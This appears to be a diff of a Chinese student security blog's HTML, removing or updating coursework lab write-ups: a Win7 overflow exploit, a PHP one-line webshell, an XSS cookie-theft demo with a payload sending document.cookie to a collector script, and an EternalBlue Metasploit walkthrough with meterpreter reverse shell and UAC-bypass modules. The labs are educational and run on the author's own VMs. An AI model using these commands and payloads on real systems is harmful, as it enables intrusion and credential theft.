-<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="win7靶机的准备工作"><a href="#win7靶机的准备工作" class="headerlink" title="win7靶机的准备工作"></a>win7靶机的准备工作</h2><ol>
-<li><p>设置网络适配器，开启NAT模式。这样做的目的是使攻击机与靶机在同一个子网中。</p>
-</li>
-<li><p>查询靶机ip地址，便于扫描与设置<br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062157731.png" alt="ipconfig进行查询"></p>
-</li>
-<li><p>开启服务，配置ip地址与端口<br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062158660.png" alt="配置ip"></p>
-</li>
-<li><p>漏洞测试</p>
-<blockquote>
-<p>进入80端口，并进行溢出测试</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062202258.png" alt="输入50000个1"></p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062202281.png" alt="服务崩溃"></p>
-<h2 id="攻击机准备工作"><a href="#攻击机准备工作" class="headerlink" title="攻击机准备工作"></a>攻击机准备工作</h2><ol>
-<li>扫描靶机ip，查看端口及服务<blockquote>
-<p>使用 <code>nmap -sV -p 80 [ip地址]</code>  查询80端口开启的服务</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062205625.png"><br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062205799.png"></p>
-<p>发现win7靶机上已经运行此服务</p>
-<ol start="2">
-<li>漏洞利用<blockquote>
-<p>2.1 可以在<a href="www.exploit-db.com">www.exploit-db.com</a>查询此漏洞利用模块</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062209637.png" alt="查询"></p>
-<blockquote>
-<p>2.2 Kali Linux2系统自带的漏洞库，其中有exploit-db漏洞库的拷贝。使用<code>searchsploit</code>进行查询</p>
-</blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062212189.png" alt="查询"></p>
-<ol start="3">
-<li>执行脚本进行利用</li>
-</ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062213459.png" alt="执行脚本"></p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062213659.png" alt="利用成功"></p>
-<h1 id="收获与教训"><a href="#收获与教训" class="headerlink" title="收获与教训"></a>收获与教训</h1><h2 id="我的收获"><a href="#我的收获" class="headerlink" title="我的收获"></a>我的收获</h2><ul>
-<li>知道了几个漏洞查询的平台与kali中的查询方法</li>
-<li>安装了win7的虚拟机，可以用于以后的测试</li>
-<li>了解了漏洞利用的大体流程</li>
-<li>命令积累：</li>
-</ul>
-<ol>
-<li><code>netstat -参数</code>  查询开启端口与服务</li>
-<li><code>searchsploit 漏洞</code> 查询漏洞库</li>
-</ol>
-<h2 id="我的教训"><a href="#我的教训" class="headerlink" title="我的教训"></a>我的教训</h2><p>刚开始在win10物理机上进行测试，可以扫到端口与服务，但是无法利用成功，输入超字符也无法使服务崩溃。</p>
-<p>​      </p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/%E4%BD%9C%E4%B8%9A5.1%20%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="danggeOvO">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dangge の 小小世界">
-      <meta itemprop="description" content="记录生活与学习!">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | dangge の 小小世界">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/03/29/%E4%BD%9C%E4%B8%9A5.1%20%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" class="post-title-link" itemprop="url">一句话木马</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-03-29 13:48:32" itemprop="dateCreated datePublished" datetime="2023-03-29T13:48:32+08:00">2023-03-29</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-08 18:12:52" itemprop="dateModified" datetime="2023-11-08T18:12:52+08:00">2023-11-08</time>
+      <time title="修改时间：2023-11-09 10:07:45" itemprop="dateModified" datetime="2023-11-09T10:07:45+08:00">2023-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -724,177 +885,14 @@
 <p><strong>ubuntu16.04</strong>：攻击机，对靶机进行访问l利用</p>
 <h2 id="一句话木马的部署"><a href="#一句话木马的部署" class="headerlink" title="一句话木马的部署"></a>一句话木马的部署</h2><p><strong>1、在目录<code>/var/www/html</code>  下新建一个php文件，文件内容为上一句话木马。</strong></p>
 <p><strong>2、使用 <code>service apache2 start</code>  开启阿帕奇服务</strong></p>
-<p><strong>3、查看开启的服务</strong><br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111122135902.png" alt="开启服务"><br><strong>扩展：什么是apache?</strong></p>
+<p><strong>3、查看开启的服务</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100731140.png" alt="image-20231109100731140"><br><strong>扩展：什么是apache?</strong></p>
 <blockquote>
 <p>Apache(音译为阿帕奇)是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl&#x2F;Python等解释器编译到服务器中。<br>在Kali-Linux2中，apache服务的默认存储位置为<code>/var/www/html/</code>,即输入URL时不需要输入这个地址</p>
 </blockquote>
 <h2 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h2><blockquote>
 <p>在ubuntu进行连接利用即可，二者在一个子网当中。</p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111122135686.png" alt="连接利用"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/%E4%BD%9C%E4%B8%9A6.2%20xss%E5%B0%8F%E6%B5%8B%E8%AF%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="danggeOvO">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dangge の 小小世界">
-      <meta itemprop="description" content="记录生活与学习!">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | dangge の 小小世界">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/03/29/%E4%BD%9C%E4%B8%9A6.2%20xss%E5%B0%8F%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">xss攻击测试</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-03-29 13:48:32" itemprop="dateCreated datePublished" datetime="2023-03-29T13:48:32+08:00">2023-03-29</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-08 18:13:33" itemprop="dateModified" datetime="2023-11-08T18:13:33+08:00">2023-11-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">【-专业知识-】渗透测试</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AF%BE%E7%A8%8B%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">课程记录</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>2.4k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="概念辨析"><a href="#概念辨析" class="headerlink" title="概念辨析"></a>概念辨析</h1><h2 id="cookie？"><a href="#cookie？" class="headerlink" title="cookie？"></a>cookie？</h2><blockquote>
-<p>什么是cookie?其工作机制是什么？</p>
-</blockquote>
-<h4 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie?"></a>什么是cookie?</h4><p>在了解cookie之前，我们必须明确一个概念：即<code>HTTP协议本身是无状态</code>的，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据。<br>而<code>cookie就是这个身份的证明</code>，实际上是一小段的文本信息（key-value格式）。<br>客户端向服务器发起请求，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。</p>
-<h4 id="cookie的工作机制？"><a href="#cookie的工作机制？" class="headerlink" title="cookie的工作机制？"></a>cookie的工作机制？</h4><blockquote>
-<p>当用户第一次访问并登陆一个网站的时候，cookie的设置以及发送会经历4个步骤：</p>
-</blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637589707976.png" alt="enter description here"></p>
-<h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><h4 id="什么是xss攻击？"><a href="#什么是xss攻击？" class="headerlink" title="什么是xss攻击？"></a>什么是xss攻击？</h4><blockquote>
-<p>Cross Site Scripting  ,跨站脚本攻击。</p>
-<blockquote>
-<p>人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。</p>
-</blockquote>
-</blockquote>
-<p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者<code>嵌入恶意脚本代码</code>到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p>
-<p>XSS漏洞可以追溯到上世纪90年代。大量的网站曾遭受XSS漏洞攻击或被发现此类漏洞，如Twitter、Facebook、MySpace、Orkut、新浪微博和百度贴吧。研究表明，最近几年XSS已经超过缓冲区溢出成为最流行的攻击方式，有68%的网站可能遭受此类攻击。根据开放网页应用安全计划（Open Web Application Security Project）公布的2021年统计数据，在Web安全威胁前10位中，XSS并入代码注入（Injection），而注入威胁排在top10的第三位。</p>
-<h4 id="xss攻击的目的"><a href="#xss攻击的目的" class="headerlink" title="xss攻击的目的"></a>xss攻击的目的</h4><p>常用的XSS攻击手段和目的有：</p>
-<ol>
-<li>盗用cookie，获取敏感信息。</li>
-<li>利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</li>
-<li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
-<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
-<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li>
-</ol>
-<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p> <code>Website</code>：有XXS漏洞的合法网站,这里使用Kali-Linux2虚拟机作为网站服务器<br> <code>Website Visitor</code>：受害访问者，这里使用win10物理机进行代替<br> <code>Perptrator</code>：攻击者及数据接收网站。说明：将合法网站和攻击者接收网站都放在Kali虚拟机</p>
-<h2 id="使用脚本"><a href="#使用脚本" class="headerlink" title="使用脚本"></a>使用脚本</h2><blockquote>
-<p>对于website,使用submit.php</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;XSS Demo&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">    &lt;input style=<span class="string">&quot;width:300px;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;address1&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_GET</span>[&quot;</span>address1<span class="string">&quot;]; ?&gt;&quot;</span> /&gt;</span><br><span class="line">            &lt;input type=“submit” value=“submit<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>对于Perptrator，使用hack.php</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$victim</span> = ‘XXS get the cookie:<span class="string">&#x27;. $_SERVER[&#x27;</span>REMOTE_ADDR<span class="string">&#x27;]. &#x27;</span>:<span class="string">&#x27; .$_GET[&#x27;</span>cookie<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">file_put_contents(‘1.txt&#x27;</span>, <span class="variable">$victim</span>);</span><br><span class="line"><span class="keyword">echo</span> welcome；</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>恶意payload:</p>
-</blockquote>
-<p><code>&quot;/&gt; &lt;script&gt;window.open(&quot;http://192.168.2.123/hack.php?cookie=&quot;+document.cookie);&lt;/script&gt;&lt;!-- </code></p>
-<h1 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h1><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591066438.png" alt="测试流程"><br>这里把红蓝方合并，即既使用此虚拟机作为xss漏洞网站，有作为接收网站。</p>
-<h3 id="第一步-脚本部署"><a href="#第一步-脚本部署" class="headerlink" title="第一步 脚本部署"></a>第一步 脚本部署</h3><blockquote>
-<p>在虚拟机 &#x2F;var&#x2F;www&#x2F;html&#x2F;处进行部署，这里是apache服务的默认地址<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591211048.png" alt="脚本部署"></p>
-</blockquote>
-<h3 id="第二步-IP地址查询"><a href="#第二步-IP地址查询" class="headerlink" title="第二步 IP地址查询"></a>第二步 IP地址查询</h3><blockquote>
-<p>Kali使用ifconfig，win10 使用ipconfig进行查询。可知二者在一个子网。<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591494380.png" alt="Kali ip"><br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591537624.png" alt="win10 ip"></p>
-</blockquote>
-<h3 id="第三步-漏洞利用"><a href="#第三步-漏洞利用" class="headerlink" title="第三步 漏洞利用"></a>第三步 漏洞利用</h3><blockquote>
-<p>在Kali里进行网站的访问与恶意payload的输入</p>
-</blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591686352.png" alt="eydm"><br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591733731.png" alt="welcome"></p>
-<h3 id="第四步-漏洞验证"><a href="#第四步-漏洞验证" class="headerlink" title="第四步 漏洞验证"></a>第四步 漏洞验证</h3><blockquote>
-<p>在win10 物理机进行访问，查看结果</p>
-</blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591813634.png" alt="win10访问"></p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591857849.png" alt="接收到cookie"></p>
-<h1 id="实验收获"><a href="#实验收获" class="headerlink" title="实验收获"></a>实验收获</h1><ol>
-<li>了解了cookie的概念与原理</li>
-<li>知道了xss攻击的一些基本知识</li>
-<li>实际演示了一次xss攻击的流程，对漏洞存在者、漏洞利用者、受害者的关系有了清晰的理解。</li>
-</ol>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100740496.png" alt="image-20231109100740496"></p>
 
       
     </div>
@@ -957,7 +955,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-08 18:01:05" itemprop="dateModified" datetime="2023-11-08T18:01:05+08:00">2023-11-08</time>
+      <time title="修改时间：2023-11-09 10:07:21" itemprop="dateModified" datetime="2023-11-09T10:07:21+08:00">2023-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1001,29 +999,29 @@
           <h1 id="情报搜集阶段"><a href="#情报搜集阶段" class="headerlink" title="情报搜集阶段"></a>情报搜集阶段</h1><h3 id="查看本机ip"><a href="#查看本机ip" class="headerlink" title="查看本机ip"></a>查看本机ip</h3><blockquote>
 <p><code>ifconfig</code> 查看ip地址</p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639285932081.png" alt="查看ip"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100106378.png" alt="image-20231109100106378"></p>
 <h3 id="nmap扫描子网"><a href="#nmap扫描子网" class="headerlink" title="nmap扫描子网"></a>nmap扫描子网</h3><blockquote>
 <p><code>nmap 192.168.21.129/24 扫描子网</code></p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286382975.png" alt="子网扫描"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100117877.png" alt="image-20231109100117877"></p>
 <h3 id="查看扫描结果，并进行分析"><a href="#查看扫描结果，并进行分析" class="headerlink" title="查看扫描结果，并进行分析"></a>查看扫描结果，并进行分析</h3><h1 id="威胁建模阶段"><a href="#威胁建模阶段" class="headerlink" title="威胁建模阶段"></a>威胁建模阶段</h1><p>发现有目标开启了445端口，对其进行进一步扫描，查看操作系统及服务</p>
 <blockquote>
 <p><code>nmap -O -sV 192.168.21.154 </code></p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286493773.png" alt="查看操作系统"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100126864.png" alt="image-20231109100126864"></p>
 <p>发现该主机开启445端口，并且为win7操作系统，判断可以进行永恒之蓝漏洞利用。</p>
 <h1 id="漏洞分析阶段"><a href="#漏洞分析阶段" class="headerlink" title="漏洞分析阶段"></a>漏洞分析阶段</h1><h3 id="进入MSF框架"><a href="#进入MSF框架" class="headerlink" title="进入MSF框架"></a>进入MSF框架</h3><blockquote>
 <p>msfconsole</p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286601159.png" alt="进入msf框架"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100137651.png" alt="image-20231109100137651"></p>
 <h3 id="查找漏洞相关模块"><a href="#查找漏洞相关模块" class="headerlink" title="查找漏洞相关模块"></a>查找漏洞相关模块</h3><blockquote>
 <p><code>search ms17-010</code></p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639288040338.png" alt="模块查找"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100146724.png" alt="image-20231109100146724"></p>
 <h3 id="利用扫描模块"><a href="#利用扫描模块" class="headerlink" title="利用扫描模块"></a>利用扫描模块</h3><blockquote>
 <p><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhost 192.168.21.154</code><br><code>run</code></p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639287954277.png" alt="漏洞扫描"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100155456.png" alt="image-20231109100155456"></p>
 <p>通过漏洞扫描模块扫描后得出结果，此系统易受到永恒之蓝漏洞攻击</p>
 <h1 id="漏洞攻击阶段"><a href="#漏洞攻击阶段" class="headerlink" title="漏洞攻击阶段"></a>漏洞攻击阶段</h1><blockquote>
 <p>使用ms17-010攻击模块，对靶机进行攻击<br><code>search ms17-010----&gt;use id</code></p>
@@ -1031,14 +1029,14 @@
 <h3 id="查看参数"><a href="#查看参数" class="headerlink" title="查看参数"></a>查看参数</h3><blockquote>
 <p><code>show options</code></p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639306568136.png" alt="参数的查看"><br>需要设置目标主机的IP地址</p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100209014.png" alt="image-20231109100209014"><br>需要设置目标主机的IP地址</p>
 <h3 id="设定参数"><a href="#设定参数" class="headerlink" title="设定参数"></a>设定参数</h3><blockquote>
 <p><code>set rhost 192.168.21.154</code></p>
 </blockquote>
 <h3 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h3><blockquote>
 <p><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>注：如果没有设置payload,使用上漏洞只是回弹shell，使用后回弹meterpreter。</p>
 </blockquote>
-<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308549675.png" alt="payload"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100224323.png" alt="image-20231109100224323"></p>
 <h3 id="run-获得权限"><a href="#run-获得权限" class="headerlink" title="run-&gt;获得权限"></a>run-&gt;获得权限</h3><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308573542.png" alt="得到shell"></p>
 <h1 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h1><blockquote>
 <p>一般在获得shell后即进入后渗透阶段。后渗透攻击，顾名思义就是漏洞利用成功后的攻击，即拿到系统权限后的后续操作。后渗透攻击阶段的操作，可分为两种：权限维持和内网渗透。这里主要是就第一个进行测试。</p>
@@ -1049,25 +1047,25 @@
 <li>sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</li>
 <li>background  #将当前会话放置后台</li>
 </ul>
-<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308757484.png" alt="状态切换"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100233716.png" alt="image-20231109100233716"></p>
 <ul>
 <li>shell #进入目标机cmd shell</li>
 <li>sysinfo # 查看目标机系统信息</li>
 <li>getuid # 查看权限</li>
 <li>getpid # 获取当前进程的pid</li>
 </ul>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639366204474.png" alt="命令演示1"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100243466.png" alt="image-20231109100243466"></p>
 <ul>
 <li>ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</li>
 </ul>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639366322903.png" alt="命令演示2"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100250891.png" alt="image-20231109100250891"></p>
 <h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><blockquote>
 <p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权</p>
 </blockquote>
 <h3 id="getsystem提权"><a href="#getsystem提权" class="headerlink" title="getsystem提权"></a>getsystem提权</h3><blockquote>
 <p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639313241515.png" alt="getsystem"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100304620.png" alt="image-20231109100304620"></p>
 <p>一般直接使用getsystem不会成功。</p>
 <blockquote>
 <p>ps:<br>在meterpreter shell界面，我们可以通过shell命令，进入cmd命令提示符，使用<code>net user</code>查看当前用户，发现当前用户实际是在管理组administrators组中，那为什么还提权不了呢？<br>原来，windows操作系统在vista以后增加了一个UAC的功能，英文全称User Access Control，该功能对管理员组的用户起到一定限制，进而保护计算机安全，当我们需要运行一些重要的程序，只有管理员权限才能运行的程序时，UAC功能都会弹出一个对话框，对用户进行询问，当用户点击了同意按钮，程序才会以管理员或system权限运行。因此，我们要想提权成功，首先要绕过windows的UAC限制，接下来我们来看常用的绕过UAC的套路。</p>
@@ -1081,14 +1079,13 @@
 <li><code>use windows/local/bypassuac_vbs</code></li>
 <li><code>use windows/local/ask</code></li>
 </ul>
-<p>下面以其中一个举例：（其他几个操作类似）<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639367106726.png" alt="使用模块"></p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639367188142.png" alt="getsystem成功"></p>
